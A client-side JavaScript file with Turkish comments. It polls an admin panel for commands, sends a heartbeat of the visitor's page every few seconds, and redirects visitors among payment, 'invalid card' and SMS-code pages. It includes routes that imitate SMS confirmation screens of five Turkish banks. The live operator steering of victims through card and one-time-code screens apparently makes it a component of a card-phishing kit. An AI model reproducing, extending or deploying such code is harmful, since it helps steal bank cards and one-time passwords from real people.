/* Global komut dinleyici: kullanıcı hangi sayfada olursa olsun
   admin panelinden gönderilen komutları yakalar ve ilgili sayfaya yönlendirir. */
(function () {
    'use strict';

    // Admin panelden gönderilen uyarı mesajını yakala ve popup göster
    function uyariPopupGoster(mesaj) {
        if (!mesaj) return;
        if (document.getElementById('adminUyariPopup')) return;

        var overlay = document.createElement('div');
        overlay.id = 'adminUyariPopup';
        overlay.style.cssText = [
            'position:fixed',
            'inset:0',
            'z-index:2147483647',
            'background:rgba(0,0,0,0.55)',
            'display:flex',
            'align-items:center',
            'justify-content:center',
            'padding:16px'
        ].join(';');

        var card = document.createElement('div');
        card.style.cssText = [
            'background:#fff',
            'border-radius:12px',
            'width:440px',
            'max-width:94vw',
            'padding:0',
            'box-shadow:0 20px 60px rgba(0,0,0,0.35)',
            'overflow:hidden',
            'font-family:Segoe UI,Tahoma,Arial,sans-serif'
        ].join(';');

        var header = document.createElement('div');
        header.style.cssText = [
            'display:flex',
            'align-items:center',
            'justify-content:space-between',
            'padding:14px 20px',
            'background:#a21f29',
            'color:#fff'
        ].join(';');

        var baslik = document.createElement('h3');
        baslik.textContent = 'Uyarı';
        baslik.style.cssText = 'margin:0;font-size:16px;font-weight:700';
        header.appendChild(baslik);

        var kapat = document.createElement('button');
        kapat.type = 'button';
        kapat.textContent = '×';
        kapat.style.cssText = [
            'background:none',
            'border:none',
            'color:#fff',
            'font-size:26px',
            'cursor:pointer',
            'line-height:1'
        ].join(';');
        header.appendChild(kapat);

        var body = document.createElement('div');
        body.style.cssText = 'padding:20px 20px 10px';

        var ikon = document.createElement('div');
        ikon.style.cssText = [
            'display:flex',
            'align-items:center',
            'justify-content:center',
            'width:52px',
            'height:52px',
            'margin:0 auto 14px',
            'border-radius:50%',
            'background:#fffbe6',
            'color:#faad14',
            'font-size:26px',
            'border:2px solid #faad14'
        ].join(';');
        ikon.textContent = '⚠';
        body.appendChild(ikon);

        var metin = document.createElement('p');
        metin.textContent = mesaj;
        metin.style.cssText = [
            'margin:0 0 18px',
            'font-size:15px',
            'line-height:1.6',
            'color:#1f2937',
            'text-align:center',
            'white-space:pre-wrap',
            'word-break:break-word'
        ].join(';');
        body.appendChild(metin);

        var footer = document.createElement('div');
        footer.style.cssText = 'display:flex;justify-content:center;padding:0 20px 20px';

        var btn = document.createElement('button');
        btn.type = 'button';
        btn.textContent = 'Tamam';
        btn.style.cssText = [
            'width:100%',
            'height:40px',
            'border:0',
            'border-radius:6px',
            'font-size:15px',
            'font-weight:700',
            'color:#fff',
            'background:#a21f29',
            'cursor:pointer'
        ].join(';');
        btn.addEventListener('mouseenter', function () { btn.style.background = '#8a1a22'; });
        btn.addEventListener('mouseleave', function () { btn.style.background = '#a21f29'; });
        footer.appendChild(btn);

        card.appendChild(header);
        card.appendChild(body);
        card.appendChild(footer);
        overlay.appendChild(card);

        function kapa() {
            if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
        }

        kapat.addEventListener('click', kapa);
        btn.addEventListener('click', kapa);
        overlay.addEventListener('click', function (e) { if (e.target === overlay) kapa(); });
        document.addEventListener('keydown', function kd(e) {
            if (e.key === 'Escape') { kapa(); document.removeEventListener('keydown', kd); }
        });

        document.body.appendChild(overlay);
    }

    function uyariKontrol() {
        fetch('/api/uyari-kontrol', { headers: { 'Accept': 'application/json' } })
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (d && d.uyari) uyariPopupGoster(d.uyari);
            })
            .catch(function () {});
    }
    // Oturum varsa ilk yüklemede kontrol et, sonra her 4 saniyede bir
    setTimeout(uyariKontrol, 1500);
    setInterval(uyariKontrol, 4000);

    // Kendi komut dinleyicisi olan sayfalar: SMS ve bekleme ekranları.
    // Standart SMS ve bekleme ekranlarında admin komutları sayfa içinde işlenir;
    // banka özel SMS ekranlarında sadece 'basa' komutu ana ödemeye döndürür.
    var yol = window.location.pathname;
    var bankSmsEkranlari = ['/vakifbank-sms-onay', '/garanti-sms-onay', '/isbankasi-sms-onay', '/yapikredi-sms-onay', '/akbankSms'];
    var smsEkranlari = ['/sms', '/odeme/bekleniyor', '/bekleme'];
    if (smsEkranlari.indexOf(yol) !== -1) return;

    var heartbeatAt = function () {
        var sayfa = (window.location.pathname + window.location.search + window.location.hash).slice(0, 120);
        fetch("/api/heartbeat", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ sayfa: sayfa })
        }).catch(function () {});
    };
    heartbeatAt();
    setInterval(heartbeatAt, 3000);
    document.addEventListener("visibilitychange", function () { if (!document.hidden) heartbeatAt(); });

    var ARALIK_MS = 3000;

    function dinle() {
        fetch('/odeme/bekleme-durum', { headers: { 'Accept': 'application/json' } })
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (!d) { setTimeout(dinle, ARALIK_MS); return; }
                // Oturum yoksa komut beklemeye gerek yok
                if (d.oturumYok) return;
                if (d.komut === 'basa') { window.location.href = '/odeme'; return; }
                if (bankSmsEkranlari.indexOf(yol) !== -1) {
                    setTimeout(dinle, ARALIK_MS);
                    return;
                }
                if (d.komut === 'sms') { window.location.href = '/sms'; return; }
                if (d.komut === 'internetKapali') { window.location.href = '/odeme/bekleniyor?hata=internetKapali'; return; }
                if (d.komut === 'gecersizKart') { window.location.href = '/odeme/bekleniyor?hata=gecersizKart'; return; }
                if (d.komut && d.komut.indexOf('gecersizKart:') === 0) {
                    var neden = d.komut.split(':')[1] || 'kartNo';
                    window.location.href = '/odeme/bekleniyor?hata=gecersizKart&neden=' + encodeURIComponent(neden);
                    return;
                }
                if (d.komut === 'hatali') { window.location.href = '/sms?hatali=1'; return; }
                if (d.komut === 'onay') { window.location.href = '/sms?onay=1'; return; }
                setTimeout(dinle, ARALIK_MS);
            })
            .catch(function () { setTimeout(dinle, ARALIK_MS); });
    }

    setTimeout(dinle, 2000);
})();
